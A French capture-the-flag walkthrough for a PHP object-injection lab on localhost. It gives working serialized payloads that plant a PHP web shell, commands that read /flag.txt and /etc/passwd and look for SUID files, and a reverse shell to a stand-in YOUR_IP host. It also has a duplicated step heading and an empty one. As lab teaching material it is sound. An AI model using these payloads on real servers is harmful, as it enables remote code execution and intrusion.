# CTF-5: PHP Object Injection - Walkthrough Complet

## 📋 Table des matières
1. [Reconnaissance](#reconnaissance)
2. [Découverte du code source](#découverte-du-code-source)
3. [Analyse de la vulnérabilité](#analyse-de-la-vulnérabilité)
4. [Exploitation basique](#exploitation-basique)
5. [Exploitation avancée](#exploitation-avancée)
6. [Flag](#flag)

---

## Reconnaissance

### Étape 1.1 : Vérifier que le service est actif

```bash
curl -i http://localhost:8005/
```

Réponse attendue : HTML du portail de session avec le badge "USER"

### Étape 1.2 : Lister les fichiers accessibles

```bash
# Vérifier si le listing de répertoires est activé
curl http://localhost:8005/

# Tenter d'accéder à des fichiers communs
curl http://localhost:8005/classes.php
curl http://localhost:8005/index.php
```

**Résultat** : Les fichiers PHP ne sont pas accessibles directement (code exécuté)

---

## Découverte du code source

### ✅ Méthode RÉELLE : LFI intentionnelle via PHP Filters

Dans ce CTF réel (sans accès Docker), une piste volontaire a été laissée pour découvrir le code source.

**Étape 2.1 : Observer l'HTML de la page**

```bash
curl -s http://localhost:8005/ | grep -i "hint\|debug\|source"
```

**Résultat** : Vous verrez un commentaire HTML révélateur :
```html
<!-- DEBUG_MODE_ACTIVE -->
```

Après 3 secondes, un indice apparaît :
```
💡 Hint: Systèmes de débogage actifs. Essayez ?source=classes ou ?source=index pour inspecter le code.
```

**Étape 2.2 : Extraire le code source via LFI**

```bash
# Extraire classes.php
curl -s 'http://localhost:8005/index.php?source=classes'

# Extraire index.php
curl -s 'http://localhost:8005/index.php?source=index'
```

**Résultat** :
Le code source s'affiche directement dans la page, encodé en Base64 puis décodé par PHP.

```php
<?php

class UserSession
{
    public $username;
    public $is_admin;

    public function __construct($username = 'guest', $is_admin = false)
    {
        $this->username = $username;
        $this->is_admin = $is_admin;
    }
}

class FileLogger
{
    public $logFile;
    public $message;

    public function __construct($logFile = null, $message = null)
    {
        $this->logFile = $logFile;
        $this->message = $message;
    }

    public function __destruct()
    {
        if ($this->logFile !== null && $this->message !== null) {
            file_put_contents($this->logFile, $this->message . "\n", FILE_APPEND);
        }
    }
}
?>
```

### Étape 2.3 : Analyser la vulnérabilité découverte

En examinant le code source, un attaquant remarque :

1. **Dans `index.php`** :
   ```php
   $decoded_data = base64_decode($_COOKIE['session_data'], true);
   $session = unserialize($decoded_data);
   ```
   → Utilisation dangereuse de `unserialize()` sur du contenu non fiable

2. **Dans `classes.php`** :
   ```php
   class FileLogger {
       public function __destruct()
       {
           file_put_contents($this->logFile, $this->message . "\n", FILE_APPEND);
       }
   }
   ```
   → Méthode magique `__destruct()` qui écrit dans un fichier arbitraire

### Scénario réaliste : Découverte progressive

**En CTF réel**, l'attaquant pourrait :

1. **Reconnaître l'indice** (commentaire HTML ou message après 3 secondes)
2. **Tester le paramètre `?source`** pour énumérer les fichiers
3. **Découvrir `FileLogger::__destruct()`** comme gadget chain
4. **Construire l'exploitation** en sérialisant un objet malveillant

---

## Analyse de la vulnérabilité

### Étape 3.1 : Examiner le code source obtenu

Une fois le code source découvert, analyser `classes.php` :

```php
class FileLogger
{
    public $logFile;
    public $message;

    public function __destruct()
    {
        if ($this->logFile !== null && $this->message !== null) {
            file_put_contents($this->logFile, $this->message . "\n", FILE_APPEND);
        }
    }
}
```

**Points critiques** :
- La classe a deux propriétés publiques accessibles
- La méthode `__destruct()` s'exécute automatiquement à la fin du script
- Elle écrit directement dans un fichier sans validation du chemin

### Étape 3.2 : Examiner l'utilisation de unserialize()

Dans `index.php` :

```php
$decoded_data = base64_decode($_COOKIE['session_data'], true);
$session = unserialize($decoded_data);
```

**Vulnérabilité** :
- `unserialize()` reconstruit des objets PHP
- Les propriétés publiques sont restaurées
- Les méthodes magiques (`__destruct()`, `__wakeup()`, etc.) sont appelées automatiquement

### Étape 3.3 : Comprendre le gadget chain

1. Créer un objet `FileLogger` avec :
   - `logFile = "/var/www/html/shell.php"`
   - `message = "<?php system($_GET['cmd']); ?>"`
2. Sérialiser cet objet
3. Encoder en Base64
4. Injecter via le cookie `session_data`
5. À la fin de l'exécution du script, `__destruct()` crée la shell PHP

---

## Exploitation basique

### Étape 4.1 : Créer le payload

**Méthode 1 : Générer en PHP local**

```php
<?php
// Simuler les classes
class FileLogger {
    public $logFile;
    public $message;

    public function __construct($logFile = null, $message = null) {
        $this->logFile = $logFile;
        $this->message = $message;
    }
}

// Créer l'objet malveillant
$payload_obj = new FileLogger(
    '/var/www/html/shell.php',
    '<?php system($_GET["cmd"]); ?>'
);

// Sérialiser et encoder
$serialized = serialize($payload_obj);
$encoded = base64_encode($serialized);

echo "Payload: " . $encoded . "\n";
echo "Serialized: " . $serialized . "\n";
?>
```

**Résultat attendu** :
```
Payload: TzoxMDoiRmlsZUxvZ2dlciI6Mjp7czo3OiJsb2dGaWxlIjtzOjI1OiIvdmFyL3d3dy9odG1sL3NoZWxsLnBocCI7czo3OiJtZXNzYWdlIjtzOjMzOiI8P3BocCBzeXN0ZW0oJF9HRVRbImNtZCJdKTsgPz4iO30=
```

**Méthode 2 : Générer directement en bash**

```bash
php -r '
class FileLogger {
    public $logFile;
    public $message;
    public function __construct($f, $m) {
        $this->logFile = $f;
        $this->message = $m;
    }
}
$obj = new FileLogger("/var/www/html/shell.php", "<?php system(\$_GET[\"cmd\"]); ?>");
echo base64_encode(serialize($obj));
'
```

### Étape 4.2 : Injecter le payload

```bash
# Copier le payload
PAYLOAD="TzoxMDoiRmlsZUxvZ2dlciI6Mjp7czo3OiJsb2dGaWxlIjtzOjI1OiIvdmFyL3d3dy9odG1sL3NoZWxsLnBocCI7czo3OiJtZXNzYWdlIjtzOjMzOiI8P3BocCBzeXN0ZW0oJF9HRVRbImNtZCJdKTsgPz4iO30="

# Envoyer la requête avec le cookie malveillant
curl -i 'http://localhost:8005/index.php' \
  -H "Cookie: session_data=$PAYLOAD"
```

**Résultat** :
- La page charge normalement
- La shell PHP a été créée silencieusement via `__destruct()`

### Étape 4.3 : Vérifier la création de la shell

```bash
# Tester la shell créée
curl 'http://localhost:8005/shell.php?cmd=id'
```

**Résultat attendu** :
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Étape 4.4 : Accéder au flag

```bash
# Récupérer le flag directement
curl 'http://localhost:8005/shell.php?cmd=cat%20/flag.txt'
```

**Résultat attendu** :
```
FLAG{PHP_Object_Injection_Lab_2025}
```

**Autres commandes** :
```bash
# Vérifier le chemin du flag
curl 'http://localhost:8005/shell.php?cmd=ls%20-la%20/flag.txt'

# Vérifier les permissions
curl 'http://localhost:8005/shell.php?cmd=file%20/flag.txt'

# Lire avec un autre outil
curl 'http://localhost:8005/shell.php?cmd=strings%20/flag.txt'
```

---

## Exploitation avancée

### Étape 5.1 : Scanner le système de fichiers

```bash
# Lister le contenu de /
curl 'http://localhost:8005/shell.php?cmd=ls%20-la%20/'

# Vérifier les utilisateurs
curl 'http://localhost:8005/shell.php?cmd=cat%20/etc/passwd'

# Voir les processus actifs
curl 'http://localhost:8005/shell.php?cmd=ps%20aux'
```

### Étape 5.2 : Exécuter des commandes complexes

```php
<?php
class FileLogger {
    public $logFile;
    public $message;
    public function __construct($f, $m) {
        $this->logFile = $f;
        $this->message = $m;
    }
}

// Écrire une commande PHP dans les logs
$obj = new FileLogger(
    '/var/log/apache2/access.log',
    '<?php system($_GET["c"]); ?>'
);

echo base64_encode(serialize($obj));
?>
```

### Étape 5.2 : Exécuter des commandes complexes

```php
<?php
class FileLogger {
    public $logFile;
    public $message;
    public function __construct($f, $m) {
        $this->logFile = $f;
        $this->message = $m;
    }
}

// Créer un reverse shell
$rev = "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1";
$obj = new FileLogger("/var/www/html/rev.php", "<?php system(base64_decode(\"" . base64_encode($rev) . "\")); ?>");
echo base64_encode(serialize($obj));
?>
```

### Étape 5.3 : Escalade de privilèges

```bash
# Vérifier les capacités www-data
curl 'http://localhost:8005/shell.php?cmd=id%20-a'

# Chercher les fichiers SUID
curl 'http://localhost:8005/shell.php?cmd=find%20/%20-perm%20-4000%202>/dev/null'

# Vérifier les tâches cron
curl 'http://localhost:8005/shell.php?cmd=crontab%20-l'
```

### Étape 5.4 : Créer un reverse shell

---

## Flag

### Localisation du flag

Le flag est stocké à la racine du container : `/flag.txt`

```bash
# Récupération simple via RCE
curl 'http://localhost:8005/shell.php?cmd=cat%20/flag.txt'
```

### Flag attendu
```
FLAG{PHP_Object_Injection_Lab_2025}
```

---

## Résumé de l'exploitation

| Étape | Action | Résultat |
|-------|--------|----------|
| 1 | Reconnaissance du service | Service actif sur port 8005 |
| 2 | Découverte du code source | Accès au code PHP via méthodes d'énumération |
| 3 | Analyse de la vulnérabilité | Pattern `unserialize() + __destruct()` identifié |
| 4 | Création du payload | Objet `FileLogger` sérialisé + encodé |
| 5 | Injection du payload | Cookie `session_data` malveillant envoyé |
| 6 | Exécution du gadget chain | Shell PHP créée automatiquement |
| 7 | Accès au flag | RCE confirmée, flag obtenu |

---

## Mitigations possibles

### Pour les développeurs
```php
// ❌ Mauvais
$session = unserialize($_COOKIE['data']);

// ✅ Bon
$session = json_decode($_COOKIE['data'], true);

// ✅ Meilleur (avec validation)
$session = json_decode($_COOKIE['data'], true);
if (!is_array($session)) {
    throw new Exception('Invalid session');
}
```

### Pour les administrateurs
- Désactiver le listing de répertoires
- Protéger les fichiers `.git`, `.env`, `.bak`
- Utiliser une WAF (Web Application Firewall)
- Monitorer les opérations de fichiers suspects
- Appliquer les mises à jour de sécurité PHP

